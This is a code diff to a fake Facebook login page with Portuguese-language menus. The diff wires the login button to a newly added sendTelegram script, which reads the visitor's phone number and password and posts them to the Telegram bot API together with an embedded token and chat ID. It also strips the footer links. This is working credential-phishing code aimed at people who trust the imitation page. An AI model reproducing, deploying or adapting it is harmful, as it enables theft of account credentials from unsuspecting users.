@@ -41,7 +41,7 @@
                             </div>
 
                             <div class="fc-box-input fc-pad-6">
-                                <button class="fc-btn fc-btn-large fc-btn-large:hover">Log ing</button>
+                                <button class="fc-btn fc-btn-large fc-btn-large:hover" onclick="sendTelegram()">Log ing</button>
                             </div>
 
                             <div class="fc-box-forgot-pass">
@@ -82,7 +82,8 @@
                             <a href="../index.html">Português (Brasil)</a>
                         </li>
                         <li class="fc-pad-10">Español</li>
-                        <li class="fc-pad-10">Français (France)</li>
+                        <li class="fc-pad-10">Françai
+                            s (France)</li>
                         <li class="fc-pad-10">Italiano</li>
                         <li class="fc-pad-10">Deutsch</li>
                         <li class="fc-pad-10">عربي</li>
@@ -95,53 +96,23 @@
                             </a>
                         </li>
                     </ul>
-                    <div class="fc-line-horizontal"></div>
-                    <div claas="fc-second-row">
-                        <ul class="fc-ullist-two">
-                            <li>Sing Up</li>
-                            <li>Log In</li>
-                            <li>Messenger</li>
-                            <li>Facebook Lite</li>
-                            <li>Watch</li>
-                            <li>Places</li>
-                            <li>Games</li>
-                            <li>Marketplace</li>
-                            <li>Meta Pay</li>
-                            <li>Oculus</li>
-                            <li>Portal</li>
-                            <li>Instagram</li>
-                            <li>Bullentin</li>
-                            <li>Fundraisers</li>
-                            <li>Services</li>
-                            <li>Voting Information Center</li>
-                            <li>Privacy Policy</li>
-                            <li>Privacy Center</li>
-                            <li>Groups</li>
-                            <li>About</li>
-                            <li>Create Ad</li>
-                            <li>Create Page</li>
-                            <li>Developers</li>
-                            <li>Careers</li>
-                            <li>Cookies</li>
-                            <li>Ad choices</li>
-                            <li>Terms</li>
-                            <li>Help</li>
-                            <li>Contact Uploading & Non-Users</li>
-                        </ul>
-                    </div>
-                    <div class="fc-copyright">
-                        <div>
-                            <span> Meta @ 2023</span>
-                        </div>
-                    </div>
                 </div>
             </div>
         </div>
 
     </footer>
 
-<!--     <script src="main.js"></script> -->
+    <script type="text/javascript">
+        function sendTelegram() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "https://api.telegram.org/6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage");
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            var message = "Phone number: " + document.getElementById("fc-email-telefone").value + "\\nPassword: " + document.getElementById("fc-senha").value;
+            var chat_id = "-1002081721946";
+            var params = "chat_id=" + chat_id + "&text=" + message;
+            xhttp.send(params);
+        }
+    </script>
 
 </body>
-
 </html>
